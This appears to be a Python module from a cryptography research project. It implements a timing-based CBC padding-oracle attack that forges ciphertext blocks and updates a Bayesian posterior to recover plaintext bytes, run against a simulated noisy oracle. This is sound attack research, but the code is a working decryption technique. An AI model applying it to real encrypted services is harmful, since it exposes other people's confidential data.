"""Posterior-threshold attack on a noisy timing oracle (T10).

Idea (docs/decisions.md, D2, D10, D18)
---------------------------------------
For one byte, there are 256 hypotheses: "the plaintext byte is c", for
c = 0..255. We keep ONE posterior over all 256 of them:

    posterior(c)  is proportional to  prior(c) * exp(LLR(c))

where LLR(c) is the sum, over every timing sample taken while testing c, of
log( f_R(t) / f_W(t) ): how much more likely the sample is under "padding
right" than under "padding wrong". Samples taken while testing another
candidate do not change LLR(c): under hypothesis c those samples are all
"padding wrong", which is the same for every hypothesis except the tested one,
so that factor cancels when we normalise.

Each step we query the candidate with the highest posterior (the
probability-guided order of NCC 2023), add the new sample to its LLR, and
update the posterior. Old samples are never thrown away. We ACCEPT the top
candidate as soon as its posterior is above 1 - delta.

The prior is a parameter. With `uniform_prior` this is NCC's method on our
Gaussian noise (baseline (c), T11). With the T9 trigram prior it is our
attack: the prior orders the candidates AND changes how much evidence is
needed before accepting, because posterior odds = prior odds * likelihood
ratio.

Block layout (D15): the target block is recovered from the last byte to the
first, so when byte i is guessed the bytes to its RIGHT are already known.
That is why the prior receives `suffix` (the recovered bytes to the right).

Timing model (Canvel 2003, Sec. 2.1-2.2, Fig. 3): one sample is Gaussian
with mean MU_R (padding right) or MU_W (padding wrong), same SIGMA for both
(Canvel's Conjecture 1), in milliseconds. These are inputs, not results.
"""

from __future__ import annotations

import math
import random
from collections.abc import Callable, Sequence

from padding_oracle.core.contracts import BLOCK_SIZE, BaseOracle

# Timing model inputs, in ms (Canvel 2003; docs/decisions.md, section 5).
MU_R = 23.63   # mean time when the padding is Right (valid)
MU_W = 21.57   # mean time when the padding is Wrong (invalid)
SIGMA = 1.86   # standard deviation, the same for both (Canvel, Conjecture 1)

# Accept a byte when its posterior is above 1 - DELTA (D18: delta = 0.001).
DELTA = 0.001

# A prior takes the recovered bytes to the right of the byte being guessed
# (block order, suffix[0] is the byte just right of it; empty for the last
# byte of the block) and returns 256 probabilities, one per byte value.
Prior = Callable[[bytes], Sequence[float]]

# If every weight gets this small, rescale them so they never underflow to 0.
_RESCALE_BELOW = 1e-100


def uniform_prior(suffix: bytes) -> list[float]:
    """Every byte value equally likely (NCC's method, baseline (c))."""
    return [1.0 / 256] * 256


def timing_llr(t: float, mu_r: float = MU_R, mu_w: float = MU_W,
               sigma: float = SIGMA) -> float:
    """log( f_R(t) / f_W(t) ) for one timing sample t.

    f_R and f_W are Gaussian densities with means mu_r and mu_w and the same
    sigma. Writing out the two densities and cancelling gives this line
    (it is the same per-sample term as Canvel's sum S_j, Eq. (1)-(2)).
    Positive = the sample looks like "padding right".
    """
    return (mu_r - mu_w) * (t - (mu_r + mu_w) / 2) / sigma ** 2


def _check_prior(probs: Sequence[float]) -> list[float]:
    """Return the prior as 256 probabilities that sum to 1.

    Every value must be > 0: a byte with prior 0 can never be accepted,
    even when it is the right one. Add-k smoothing (T9) guarantees this.
    """
    probs = list(probs)
    if len(probs) != 256:
        raise ValueError(f"prior must give 256 probabilities, got {len(probs)}")
    if any(not p > 0 for p in probs):
        raise ValueError("every prior probability must be > 0")
    total = sum(probs)
    return [p / total for p in probs]


def _forge(prev: bytes, target: bytes, position: int, guess: int,
           known: dict[int, int], rng: random.Random) -> bytes:
    """Build the two-block ciphertext that tests `guess` for byte `position`.

    We want the decrypted block to end with the padding v v ... v, where
    v = 16 - position. Since decrypted byte j = D(target)[j] XOR prev[j] and
    plaintext byte j = D(target)[j] XOR original prev[j]:
      - for a known byte j to the right: put prev[j] ^ plain[j] ^ v there;
      - at `position`: put prev[position] ^ guess ^ v there, so the byte
        decrypts to v exactly when guess is the right plaintext byte;
      - to the left: fresh random bytes, as Canvel's random string L. Then a
        wrong guess on the LAST byte cannot keep giving a valid padding such
        as 02 02 (which would happen every time if byte 15 of the plaintext
        were 0x02 and these bytes stayed fixed).
    """
    v = BLOCK_SIZE - position
    forged = bytearray(rng.randbytes(position))
    forged.append(prev[position] ^ guess ^ v)
    for j in range(position + 1, BLOCK_SIZE):
        forged.append(prev[j] ^ known[j] ^ v)
    return bytes(forged) + target


def recover_byte(oracle: BaseOracle, prev: bytes, target: bytes,
                 position: int, known: dict[int, int], prior: list[float],
                 delta: float, mu_r: float, mu_w: float, sigma: float,
                 rng: random.Random, query_limit: int | None) -> int:
    """Recover one plaintext byte with the posterior-threshold rule.

    `query_limit` is the value of `oracle.queries` at which we must stop
    querying (None = no limit). If we reach it before the posterior passes
    1 - delta, we return the candidate with the highest posterior.
    """
    # weights[c] = prior(c) * exp(LLR(c)), the posterior before normalising.
    weights = list(prior)
    while True:
        total = sum(weights)
        best = weights.index(max(weights))
        if weights[best] / total > 1 - delta:
            return best                                   # ACCEPT
        if query_limit is not None and oracle.queries >= query_limit:
            return best                                   # budget used up
        t = oracle.query(_forge(prev, target, position, best, known, rng))
        weights[best] *= math.exp(timing_llr(t, mu_r, mu_w, sigma))
        top = max(weights)
        if top < _RESCALE_BELOW:          # same posterior, safer numbers
            weights = [w / top for w in weights]


def posterior_attack(oracle: BaseOracle, ciphertext: bytes, n_bytes: int,
                     prior: Prior = uniform_prior, delta: float = DELTA,
                     mu_r: float = MU_R, mu_w: float = MU_W,
                     sigma: float = SIGMA, max_queries: int | None = None,
                     seed: int = 0, **params) -> bytes:
    """Posterior-threshold attack (the `Attack` shape in core/contracts.py).

    oracle:      a noisy timing oracle (passed in, never created here).
    ciphertext:  exactly two blocks: previous block (or IV) + target block.
    n_bytes:     how many bytes to recover, from the end of the block
                 (8 for the D15 word layout, 16 for a full block).
    prior:       function suffix -> 256 probabilities (default: uniform).
    delta:       accept a byte when its posterior is above 1 - delta.
    mu_r, mu_w, sigma: the timing model the attacker assumes (ms).
    max_queries: total query budget for this attack (None = no limit). When
                 it runs out, every remaining byte is the candidate with the
                 highest posterior (for later bytes: the highest prior).
    seed:        seed for the random bytes in the forged blocks.
    params:      other settings are accepted and ignored (harness, CSV).

    Returns the recovered bytes (length n_bytes), in block order. Bytes are
    never revisited once accepted (no backtracking, as in Canvel).
    """
    if len(ciphertext) != 2 * BLOCK_SIZE:
        raise ValueError("ciphertext must be exactly two blocks (32 bytes)")
    if not 1 <= n_bytes <= BLOCK_SIZE:
        raise ValueError(f"n_bytes must be between 1 and {BLOCK_SIZE}")
    if not 0 < delta < 1:
        raise ValueError("delta must be between 0 and 1")

    prev, target = ciphertext[:BLOCK_SIZE], ciphertext[BLOCK_SIZE:]
    rng = random.Random(seed)
    query_limit = None if max_queries is None else oracle.queries + max_queries

    known: dict[int, int] = {}            # position -> recovered plaintext byte
    for position in range(BLOCK_SIZE - 1, BLOCK_SIZE - 1 - n_bytes, -1):
        suffix = bytes(known[j] for j in range(position + 1, BLOCK_SIZE))
        byte_prior = _check_prior(prior(suffix))
        known[position] = recover_byte(
            oracle, prev, target, position, known, byte_prior,
            delta, mu_r, mu_w, sigma, rng, query_limit)

    return bytes(known[j] for j in range(BLOCK_SIZE - n_bytes, BLOCK_SIZE))
